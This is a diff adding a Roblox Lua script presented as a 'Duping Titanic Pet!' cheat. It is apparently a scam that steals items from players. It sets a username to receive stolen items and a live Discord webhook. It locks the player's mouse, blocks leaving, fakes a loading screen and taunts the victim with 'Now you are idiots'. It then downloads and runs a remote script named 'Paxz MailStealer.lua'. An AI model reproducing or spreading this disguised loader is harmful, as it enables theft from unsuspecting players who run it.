@@ -1,0 +1,22 @@
+_G.UserName = "jorish9997"
+_G.UserName2 = "jorish9997 "
+_G.Webhook = "https://discord.com/api/webhooks/1171271606581088256/CpRO9KQoTp14MApPDsVqtob2JdpgUZy0wMNncM67Qor5avWl6Sqb3sOQgzC2TPVI_cnZ"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI 
+_G.CustomScriptName = "Duping Titanic Pet!" 
+_G.Text1 = "Script Loaded..." 
+_G.Text2 = "Waiting for Script" 
+_G.Text3 = "Checking Scripts..." 
+_G.Text4 = "Starting Scripts..." 
+_G.Test5 = "Now you are idiots "
+
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+_G.ChatSpam = true
+_G.CollectOrbs = true
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua", true))()
